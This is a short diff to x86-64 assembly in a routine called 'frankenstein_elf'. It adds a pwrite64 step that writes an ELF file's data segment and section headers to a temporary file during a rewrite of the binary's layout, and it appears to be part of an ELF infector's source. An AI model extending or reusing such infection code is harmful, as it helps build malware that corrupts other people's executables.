@@ -934,6 +934,8 @@ frankenstein_elf:
 		mov rax, SYS_WRITE
 		syscall
 
+
+		push rsi
 	;.lseek_end_phdrs:
 		;mov rdi, r9						; prob unnecessary since this should still be the val in rdi
 		;mov rsi, rdx					;(offset in rsi =hostentryoffset)
@@ -992,6 +994,21 @@ frankenstein_elf:
 		mov rax, SYS_FTRUNCATE
 		syscall
 		
+	.write_datasegment_shdrs_totemp:
+		mov rdx, [r14 + filestat.st_size]
+		sub edx, dword [data_offset_original]
+
+		pop rsi		
+;		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
+		;mov rsi, r13
+		;add esi, data_offset_original
+		;add esi, dword [data_offset_original]
+		;mov r11, r13
+		;add r11, data_offset_original
+		;mov rsi, r11
+		mov r10d, dword [data_offset_new_padding]
+		mov rax, SYS_PWRITE64
+		syscall
 		
 		;munmap file from work area
 		;mov qword rsi, [elf_filesize]
